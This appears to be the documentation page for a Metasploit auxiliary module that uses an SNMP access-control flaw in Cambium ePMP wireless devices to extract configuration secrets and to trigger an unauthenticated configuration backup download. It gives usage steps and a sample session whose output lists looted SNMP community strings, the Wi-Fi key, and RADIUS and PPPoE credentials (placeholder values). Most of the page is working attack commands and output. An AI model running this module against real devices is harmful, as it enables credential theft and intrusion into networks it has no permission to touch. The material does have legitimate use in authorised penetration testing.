Cambium devices (ePMP, PMP, Force, others) can be administered using SNMP. The device configuration contains IP addresses, keys, and passwords, amongst other information. This module uses SNMP to extract Cambium ePMP device configuration. On certain software versions, specific device configuration values can be accessed using SNMP RO string, even though only SNMP RW string should be able to access them, according to MIB documentation.

The module also triggers full configuration backup, and retrieves the backup url. The configuration file can then be downloaded without authentication. The module has been tested on Cambium ePMP versions <=3.5.

Note: If the backup url is not retrieved, it is recommended to increase the TIMEOUT and reduce the number of THREADS.

## Verification Steps

1. Do: ```use auxiliary/scanner/snmp/epmp1000_snmp_loot```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set COMMUNTY [SNMP_COMMUNUTY_STRING]```
4. Do: ```run```

## Scenarios

  ```
msf > use auxiliary/scanner/snmp/epmp_snmp_loot
msf auxiliary(epmp_snmp_loot) > set rhosts 1.3.3.7
msf auxiliary(epmp_snmp_loot) > set COMMUNITY private
msf auxiliary(epmp_snmp_loot) > run

msf auxiliary(epmp1000_snmp_loot) > run

[*] Fetching System Information...

[+] 1.3.3.7
[+] SNMP System Name: Cambium
[+] SNMP System Description: Cambium
[+] Device UpTime: 0021:08:36:45
[+] U-boot version: U-Boot 9350_PX 1.1.4.e (Feb 24 2016 - 20:14:38)

[*] Fetching SNMP Information...

[+] SNMP read-only community name: public
[+] SNMP read-write community name: private
[+] SNMP Trap Community: cambiumtrap
[+] SNMP Trap Server IP Address: Null

[*] Fetching WIFI Information...

[+] Wireless Interface SSID: SSID
[+] Wireless Interface Encryption Key: secretkey
[+] Wireless Interface Encryption (1 - Open mode, 2 - wpa2 mode, 3 - EAP-TTLS): 2

[*] Fetching WIFI Radius Information...

[+] RADIUS server info:
[+] RADIUS server port: Null
[+] RADIUS server secret: Null
[+] Wireless Radius Username: cambium-station
[+] Wireless Radius Password: cambium

[*] Fetching Network PPPoE Information...

[+] Network PPPoE Service Name: temp
[+] Network PPPoE Username: username
[+] Network PPPoE Password: password

[+] 1.3.3.7 - Cambium ePMP loot saved at /root/.msf4/loot/20000000000003_default_1.3.3.7_snmp_loot_000001.txt
[+] 1.3.3.7 - Configuration backed-up for direct download at: http://1.3.3.7/dl/3.5_00000000000001.json
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

  ```
